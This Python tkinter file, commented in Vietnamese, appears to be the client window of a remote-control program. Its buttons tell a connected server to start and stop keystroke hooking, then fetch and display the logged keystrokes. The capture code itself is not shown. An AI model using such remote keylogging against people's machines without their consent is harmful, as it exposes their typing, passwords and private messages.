from tkinter import Tk, W, E
from tkinter import Tk, Text, TOP, BOTH, X, N, LEFT
from tkinter.ttk import Frame, Label, Button, Entry
from tkinter import *

def keystroke(client):
	# Tạo ra cửa sổ của Keystroke
		logger = ''
		Stroke = Tk()
		Stroke.title("Keystroke")  
		Stroke.geometry("425x320")
		Stroke.configure(bg = 'white')
		Stroke.resizable(False, False)

	
		tab = Text(Stroke, width = 50, heigh = 15)
		tab.grid(row = 3, column = 0, columnspan= 4)
		HookClicked = False
		UnhookClicked = False

		def ReceiveHook(client):
			data = client.recv(1024).decode("utf-8")			# Nhận dữ liệu từ server
			client.sendall(bytes(data,"utf-8"))  				# Gửi dữ liệu đến server
			return data

		def Hookkey():
			nonlocal HookClicked, UnhookClicked
			if HookClicked == True: return						# Nếu như nút Hook đã được nhấn thì không thực hiện gì cả
			HookClicked = True									# Nếu như nút Hook chưa được nhấn thì thực hiện các lệnh sau
			UnhookClicked = False								# Nút Unhook chưa được nhấn
			client.sendall(bytes("HookKey","utf-8"))			# Gửi dữ liệu đến server
			checkdata = client.recv(1024).decode("utf-8")		# Nhận dữ liệu từ server

		def Unhookkey():
			nonlocal logger, UnhookClicked, HookClicked
			if HookClicked == True:
				client.sendall(bytes("UnhookKey","utf-8"))    
				logger = ReceiveHook(client)
				client.sendall(bytes(logger,"utf-8")) 
				UnhookClicked = True
				HookClicked = False

		def Printkey():
			nonlocal logger, UnhookClicked, HookClicked
			if UnhookClicked == False: 
				client.sendall(bytes("UnhookKey","utf-8"))
				logger = ReceiveHook(client)
			tab.delete(1.0, END)
			tab.insert(1.0, logger)
			UnhookClicked = True
			HookClicked = False

		def Deletekey():
			tab.delete(1.0,END)
					    
		hook = Button(Stroke, text = "Hook", font = "Helvetica 10 bold",width=6, bg = "#8DDDE0", activebackground='#497172', padx = 17, pady = 20, command = Hookkey).grid(row = 1,column = 0,sticky=E)
		unhook = Button(Stroke, text = "Unhook",font = "Helvetica 10 bold",width=6 , bg = "#F9BDC0", activebackground='#7e5a5c', padx = 17, pady = 20, command = Unhookkey).grid(row = 1,column = 1,sticky=E) 
		print = Button(Stroke, text = "Print",font = "Helvetica 10 bold",width=6 ,bg = "#FBE698", activebackground='#776d47', padx = 17, pady = 20,command = Printkey).grid(row = 1,column = 2,sticky=E)
		delete = Button(Stroke, text = "Delete", font = "Helvetica 10 bold",width=6 , bg = "#8B795E", activebackground='#3f302a',padx = 17, pady = 25,command = Deletekey).grid(row = 1,column = 3,sticky=E)
123456
